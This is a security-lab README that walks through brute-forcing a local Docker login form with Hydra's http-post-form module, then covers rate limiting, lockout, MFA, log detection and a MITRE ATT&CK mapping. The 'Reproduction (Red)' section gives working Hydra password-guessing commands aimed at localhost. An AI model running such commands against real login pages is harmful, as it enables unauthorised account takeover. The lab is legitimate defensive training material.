# Hydra 02 - HTTP form brute-force (local lab)

**Walkthrough:** [▶️ Watch on YouTube](https://youtu.be/v7YRHpcEzHg)  
**Status:** Published  
**Scope:** Local Docker target on `http://127.0.0.1:8080/` only

## 1) Scenario

Brute-force a classic **username + password HTML form** with Hydra’s `http-post-form` module. Practice tuning threads and interpreting **HTTP 200** responses where success is a redirect and failure is an inline error string.

## 2) Scope & authorization

- Use only your own machine or lab VM.
- Do not point Hydra at third-party sites.
- Keep the target on localhost for training.

## 3) Reproduction (Red)

### Start target

```bash
cd labs/offensive-red/hydra/02-http-form
chmod +x start-lab.sh stop-lab.sh
./start-lab.sh
```

Target defaults:

- URL: `http://127.0.0.1:8080/login.php`
- User: `labuser`
- Password: `labpass`

### Run Hydra

Quick smoke test:

```bash
hydra -l labuser -P words-quick.txt 127.0.0.1 -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password"
```

Longer demo (video + artifacts):

```bash
hydra -l labuser -P words-demo.txt 127.0.0.1 -s 8080 -t 1 -W 2 -V -o artifacts/hydra-http-form.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password"
```

## 4) Remediation (Blue)

- Enforce **rate limiting** and **account lockout** (or progressive delays) on the application or reverse proxy.
- Deploy **WAF** / **ModSecurity** rules for credential-stuffing patterns.
- Prefer **MFA** and **strong password policy**; monitor **failed login** bursts per IP and per user.
- Centralize web access logs in a SIEM; alert on repeated `POST /login.php` with 401/403 or repeated failures.

## 5) Verification

- Confirm Hydra only reports success when the failure marker is absent (redirect to success page).
- Add throttling (or a tiny reverse proxy limit) and observe Hydra slow-down or HTTP 429 if you extend the lab.
- Correlate timestamps with Apache/PHP container logs.

## 6) Artifacts

- `commands.md` — copy-paste command reference
- `words-quick.txt`, `words-demo.txt` — wordlists
- `artifacts/hydra-http-form.txt` — optional saved Hydra output

## 7) Defensive takeaway

- Form brute-force is **high volume HTTP**; it stands out in access logs if you look for POST cadence to `/login`.
- The `http-post-form` module depends on a **stable failure signature**; defenders can still detect the pattern without knowing the exact string.
- Application-level controls beat hiding the error message alone.

## 8) MITRE ATT&CK mapping


| ATT&CK Tactic     | Technique ID | Why it matches this lab                    | Detection idea                                | Mitigation                                      |
| ----------------- | ------------ | ------------------------------------------ | --------------------------------------------- | ----------------------------------------------- |
| Credential Access | T1110.001    | Password guessing against a web login form | Spike in failed logins; POST rate to `/login` | Rate limit, MFA, WAF, lockout, strong passwords |


